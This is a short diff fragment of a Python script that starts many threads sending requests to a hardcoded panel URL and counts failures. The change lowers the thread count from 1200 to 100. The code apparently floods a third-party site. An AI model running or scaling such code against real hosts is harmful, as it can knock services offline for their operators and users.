@@ -38,7 +38,7 @@ def chek(url):
                 stats["failed"] += 1
 def start_threads():
     target_url = "https://panel.hexor1.xyz/"
-    for _ in range(1200):
+    for _ in range(100):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
